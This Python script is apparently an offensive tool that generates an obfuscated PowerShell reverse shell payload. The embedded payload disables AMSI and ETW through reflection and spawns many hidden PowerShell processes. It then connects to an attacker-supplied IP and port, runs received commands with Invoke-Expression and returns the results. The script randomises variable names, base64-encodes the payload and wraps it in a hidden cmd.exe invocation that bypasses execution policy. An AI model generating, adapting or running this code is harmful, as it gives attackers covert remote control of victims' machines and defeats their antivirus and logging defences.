import random
import string
import base64

def random_variable_name(size=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(size))

def rename_variables(script):
    variables = {
        "$36": random_variable_name(),
        "$54f2cdce": random_variable_name(),
        "$Isw": random_variable_name(),
        "$PIwtuneQ": random_variable_name(),
        "$LjucdE": random_variable_name(),
        "$1e8": random_variable_name(),
        "$eil": random_variable_name(),
        "$eRBwTzLwlp": random_variable_name(),
        "$Ncq": random_variable_name()
    }
    for old, new in variables.items():
        script = script.replace(old, new)
    return script

def encode_to_base64(script):
    return base64.b64encode(script.encode("utf-16le")).decode()

def build_cmd_payload(encoded_script):
    var1 = random_variable_name()
    var2 = random_variable_name()
    return f'cmd /v /c "set {var1}=powershell && set {var2}=\\" \\" && call !{var1}!!{var2}!-W!{var2}!Hidden!{var2}!-noprofile!{var2}!-executionpolicy!{var2}!bypass!{var2}!-NoExit!{var2}!-e!{var2}!{encoded_script}"'

# PowerShell payload template
ps_script_template = r"""
(([Ref].Assembly.GetTypes()|?{$_-clike'*si*s'}).GetFields(40)|?{$_-clike'*Ini*'}).SetValue($276940ea7141886b,$true);
(([Reflection.Assembly]::LoadWithPartialName('System.Core').GetTypes()|?{$_-clike'*i*'}).GetFields(52)|?{$_-clike'*m_e*d'}).SetValue((([Ref].Assembly.GetTypes()|?{$_-clike'*E*r'}).GetFields(104)|?{$_-clike'*t*w*r'}).GetValue($null),0);
start-job{$t = $("0"*32700);For ($i = 0; $i -lt 200; $i++) {Start-Process powershell.exe -WindowStyle hidden -Argument "$t;Exit"}};
$36='IP_ADDRESS';
$54f2cdce=PORT_NUMBER;
$Isw=New-Object Net.$276940ea7141886b"Sockets.Socket"([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::Tcp);
$Isw.Connect($36, $54f2cdce);
while ($true) {
    $Error.Clear();
    $PIwtuneQ = New-Object byte[] $Isw.ReceiveBufferSize;
    $LjucdE=$Isw.Receive($PIwtuneQ);
    $1e8=[text.encoding]::UTF8.GetString($PIwtuneQ,0,$LjucdE);
    try {
        $eil=Invoke-Expression -Command $1e8 | Out-String;
    } catch {
        $eil = $_.Exception.Message+([System.Environment]::NewLine);
    }
    if (!$eil) {
        $eil = $Error[0].Exception.Message;
    }
    $eRBwTzLwlp=($env:UserName)+'@'+($env:COMPUTERNAME)+'.'+($env:USERDNSDOMAIN)+([System.Environment]::NewLine)+'PS '+(get-location)+'>';
    $Ncq=[text.encoding]::UTF8.GetBytes($eil+$eRBwTzLwlp);
    if($1e8 -eq ''){$Isw.Close();exit;}else{$Isw.Send($Ncq);}
}
"""

def main():
    print("=" * 70)
    print("    Reverse Shell Payload Generator - Single Mode: CMD + Base64 + Renaming")
    print("    Creator: https://github.com/luftwaffe66")
    print("=" * 70)

    ip = input("Target IP or Hostname: ").strip()
    port = input("Target Port: ").strip()

    script = ps_script_template.replace('IP_ADDRESS', ip).replace('PORT_NUMBER', port)
    obfuscated_script = rename_variables(script)
    encoded_script = encode_to_base64(obfuscated_script)

    final_payload = build_cmd_payload(encoded_script)

    print("\nGenerated Payload (ready to execute via CMD):\n")
    print(final_payload)

if __name__ == "__main__":
    main()
